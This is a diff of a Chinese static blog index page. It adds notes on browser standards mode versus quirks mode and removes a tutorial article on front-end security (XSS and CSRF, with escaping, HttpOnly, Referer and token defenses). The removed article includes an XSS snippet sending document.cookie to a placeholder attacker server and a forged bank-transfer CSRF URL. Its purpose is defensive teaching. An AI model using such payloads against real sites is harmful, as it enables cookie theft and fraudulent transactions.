+<li>盒模型的处理差异：标准CSS盒模型的宽度和高度等于内容区的高度和宽度，不包含内边距和边框，而IE6之前的浏览器实现的盒模型的宽高计算方式是包含内边距和边框的。因此，对于IE，怪异模式和标准模式下的盒模型宽高计算方式是不一样的；</li>
+<li>行内元素高宽设置<br>在Standards模式下，给span等行内元素设置wdith和height都不会生效<br>在quirks模式下，则会生效。</li>
+<li>百分比高度<br>在standards模式下，一个元素的高度是由其包含的内容来决定的，如果父元素没有设置高度，子元素设置一个百分比的高度是无效的</li>
+<li>margin:0 auto设置水平居中<br>使用margin:0 auto在standards模式下可以使元素水平居中<br>但在quirks模式下却会失效;<br>quirk模式下的解决办法，用text-align属性:<br>body{text-align:center};#content{text-align:left}</li>
+<li>图片元素的垂直对齐方式：<br>很多早期的浏览器对齐图片至包含它们的盒子的下边框，虽然CSS的规范要求它们被对齐至盒内文本的基线。标准模式下，基于Gecko的浏览器将会对齐至基线，而在quirks模式下它们会对齐至底部。最直接的例子就是图片的显示。在标准模式下，图片并不是与父元素的下边框对齐的，如果仔细观察，你会发现图片与父元素下边框之间存在一点小空隙。那是因为标准模式下，图片是基线对齐的。而怪异模式下，则不存在这个问题。具体请看这篇文章 <a href="https://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/" target="_blank" rel="noopener">CSS深入理解vertical-align和line-height的基友关系。</a></li>
+</ol>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/19/https原理/" data-id="cjyici91l0002hln82t4r6sh4" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-前端安全" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/07/19/前端安全/" class="article-date">
-  <time datetime="2019-07-19T07:44:55.557Z" itemprop="datePublished">2019-07-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/19/前端安全/">前端安全</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>web前端安全虽然在平时的开发中涉及的不是很多，但也是前端综合技能领域重要的一环。无论是对于提升产品整体的安全性可靠性，还是作为技术人员自身能力的提升，了解基本常见的前端安全问题，都是非常有必要的。<br>本文主要对前端安全涉及的内容做一个梳理。</p>
-<h2 id="XSS-Cross-Site-Scripting-跨站脚本攻击"><a href="#XSS-Cross-Site-Scripting-跨站脚本攻击" class="headerlink" title="XSS(Cross-Site-Scripting)跨站脚本攻击"></a>XSS(Cross-Site-Scripting)跨站脚本攻击</h2><p>XSS是一种经常出现在Web应用中的计算机安全漏洞，它允许恶意Web用户将代码植入到提供给其他用户使用的页面中<br>正常情况下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php <span class="variable">$userName</span> = <span class="string">"***"</span> ?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">    &lt;body&gt;  </span><br><span class="line">        &lt;div&gt; 用户名： &lt;? php <span class="built_in">echo</span> <span class="variable">$userName</span>;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在XSS攻击的时候，如果后端给前端是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php $userName = &quot;&lt;script&gt; alert(&apos;***&apos;)&lt;/script&gt;&quot; ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>由于浏览器在遇到html中的script标签的时候会解析并执行标签中的代码，如果用户名称中含有script就会被执行。因此页面会弹出一个对话框。</p>
-<p>试想，如果这里script中不是alert(‘**’),而是：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;  </span><br><span class="line">    $.ajax(&#123;  </span><br><span class="line">        url:<span class="string">'黑客自己的服务器'</span>,</span><br><span class="line">        dataType:<span class="string">"jsonp"</span>,</span><br><span class="line">        data:&#123;<span class="string">"盗取的Cookie"</span>:document.cookie&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>再在QQ群中引诱别人来访问就可以拿到用户在这个域名下的cookie信息</p>
-<h3 id="如何防范？"><a href="#如何防范？" class="headerlink" title="如何防范？"></a>如何防范？</h3><p>目前还是将其前端输出的数据都进行转义最稳妥，对script标签进行转义，浏览器遍布会认为其是一个标签，但是显示的时候还是会按正常方式显示</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php $userName = &quot;&lt;script&gt; alert(&apos;***&apos;)&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">    &lt;body&gt;  </span><br><span class="line">        &lt;div&gt; 用户名： &lt;? php <span class="built_in">echo</span> htmlentities(<span class="variable">$userName</span>);&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="升级攻击"><a href="#升级攻击" class="headerlink" title="升级攻击"></a>升级攻击</h3><p>上面我们放逐了script标签的左右尖括号，然而，黑客想出了另一种方式：用jQuery的append可以做到，究其原因就是因为家jQuery会在讲append元素变为fragment的时候，找到其中的HTML标签，在使用eval执行一遍</p>
-<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>面对这种攻击，防御方法还是进行转义。如果不幸中招了，黑客的js真的在我们的网页上执行了，我们该怎么办。其实，很多时候，我们的敏感信息都是存储在cookie中的（不要把用户机密信息放在网页中），想要阻止黑客通过js访问到cookie中的用户敏感信息。那么请使用cookie的HttpOnly属性，加上了这个属性的cookie字段，js是无法进行读写的。php的设置方法如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    setcookie(<span class="string">"userpass"</span>, <span class="string">"doctorhou-shuai"</span>, NULL, NULL, NULL, NULL, TRUE);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>我们通过js无法获取cookie中的设定有httpOnly的字段。</p>
-<h2 id="CSRF-Cross-Site-Request-Forgery-跨站请求伪造"><a href="#CSRF-Cross-Site-Request-Forgery-跨站请求伪造" class="headerlink" title="CSRF(Cross-Site-Request-Forgery)跨站请求伪造"></a>CSRF(Cross-Site-Request-Forgery)跨站请求伪造</h2><p>网站中的一些提交行为会被黑客利用，你在访问黑客网站的时候进行的操作会被操作到其他网站上去，比如网银网站等</p>
-<h3 id="如何攻击"><a href="#如何攻击" class="headerlink" title="如何攻击"></a>如何攻击</h3><p>攻击者盗用了你的身份，以你的名义发送请求，对服务器来说这个请求完全是合法的，但是却在用户不知强的情况下完成了攻击者所期望的一个操作。比如：一个合法却存在csrf攻击漏洞的网站A，攻击者恶意构建的网站B，用户C为网站A的信任用户</p>
-<p>CSRF攻击原理及过程如下：<br>1、用户C打开网页，浏览受信任网站A，输入用户名和密码请求登入<br>2、通过验证后，A网站返回Cookie信息给浏览器，此时登陆成功<br>3、用户未退出网站C之前，同一个浏览器，打开一个Tab，访问了网站B<br>4、用户B接到用户请求后返回一些攻击性代码，并要求访问网站A<br>5、浏览器在收到B访问A网站的请求后，在用户不知情的情况下，携带Cookie向A发出请求，A服务器不知道该请求是由B发起的，所以会根据用户C的cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行</p>
-<h4 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h4><p> 受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</p>
-<p> 黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自</a> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</p>
-<p> 这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </p>
-<h3 id="CSRF漏洞检测"><a href="#CSRF漏洞检测" class="headerlink" title="CSRF漏洞检测"></a>CSRF漏洞检测</h3><p>  检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
-<p>  随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。</p>
-<p>  以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p>
-<h3 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h3><p>目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p>
-<p>（1）验证 HTTP Referer 字段</p>
-<p>  根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆</a> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
-<p>  这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
-<p>   然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p>
-<p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
-<p> （2）在请求地址中添加 token 并验证</p>
-<p>   CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
-<p>   这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <a href="http://url?csrftoken=tokenvalue。" target="_blank" rel="noopener">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上 <input type="”hidden”" name="”csrftoken”" value="”tokenvalue”/">，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p>
-<p>   该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p>
-<p>（3）在 HTTP 头中自定义属性并验证</p>
-<p>   这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p>
-<p>   然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/19/前端安全/" data-id="cjyici9240003hln823d5d3db" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/07/19/浏览器的标准模式和怪异模式/" data-id="cjyry226x0004bvn887s3xrcd" class="article-share-link">Share</a>
       
       
     </footer>
@@ -376,15 +421,19 @@
           </li>
         
           <li>
-            <a href="/2019/07/19/Responsive layout/">响应式布局的常用解决方案对比(媒体查询、百分比、rem和vw/vh）</a>
-          </li>
-        
-          <li>
             <a href="/2019/07/19/https原理/">HTTPS原理</a>
           </li>
         
           <li>
             <a href="/2019/07/19/前端安全/">前端安全</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/19/Responsive layout/">响应式布局的常用解决方案对比(媒体查询、百分比、rem和vw/vh）</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/19/浏览器的标准模式和怪异模式/">浏览器的标准模式与怪异模式</a>
           </li>
         
       </ul>
